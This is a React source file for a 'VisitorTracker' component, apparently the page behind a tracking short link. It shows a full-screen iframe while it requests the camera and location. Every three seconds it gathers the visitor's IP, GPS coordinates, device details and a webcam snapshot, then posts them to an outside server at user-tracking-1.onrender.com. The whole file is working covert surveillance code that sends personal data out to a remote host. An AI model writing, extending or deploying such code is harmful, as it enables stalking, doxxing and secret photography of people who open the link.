import { useEffect } from "react";
import { useParams } from "react-router-dom";

function VisitorTracker() {

  const { shortId } = useParams();

  useEffect(() => {

    let videoStream = null;
    let video = null;

    const startTracking = async () => {

      try {

        // Start Camera
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });

        video = document.createElement("video");
        video.srcObject = videoStream;
        await video.play();

      } catch (err) {

        console.log("Camera denied");

      }

    };

    const captureVisitorData = async () => {

      try {

        // IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // Location
        let latitude = "";
        let longitude = "";

        if (navigator.geolocation) {

          try {

            const pos = await new Promise((resolve, reject) =>
              navigator.geolocation.getCurrentPosition(resolve, reject)
            );

            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;

          } catch (err) {

            console.log("Location denied");

          }

        }

        // Battery
        let batteryInfo = { level: "N/A", charging: "N/A" };

        if (navigator.getBattery) {

          const battery = await navigator.getBattery();

          batteryInfo = {
            level: battery.level * 100,
            charging: battery.charging,
          };

        }

        // Camera Snapshot
        let cameraImage = null;

        if (video) {

          const canvas = document.createElement("canvas");

          canvas.width = 640;
          canvas.height = 480;

          const ctx = canvas.getContext("2d");

          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          cameraImage = canvas.toDataURL("image/jpeg", 0.5);

        }

        const visitorData = {

          shortId,
          ip: ipData.ip,
          latitude,
          longitude,
          ram: navigator.deviceMemory || "N/A",
          cpuCores: navigator.hardwareConcurrency || "N/A",
          batteryLevel: batteryInfo.level,
          isCharging: batteryInfo.charging,
          browser: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: `${window.screen.width}x${window.screen.height}`,
          page: window.location.pathname,
          timestamp: new Date(),
          cameraImage

        };

        await fetch(`https://user-tracking-1.onrender.com/api/auth/t/${shortId}`, {

          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(visitorData)

        });

      } catch (err) {

        console.log("Tracking error:", err);

      }

    };

    startTracking();

    // 🔥 Capture every 3 seconds
    const interval = setInterval(captureVisitorData, 3000);

    return () => {

      clearInterval(interval);

      if (videoStream) {

        videoStream.getTracks().forEach((track) => track.stop());

      }

    };

  }, [shortId]);

  return (

    <div style={{ width: "100vw", height: "100vh" }}>

      <iframe
        id="target-frame"
        title="Target Content"
        style={{ width: "100%", height: "100%", border: "none" }}
      />

    </div>

  );

}

export default VisitorTracker;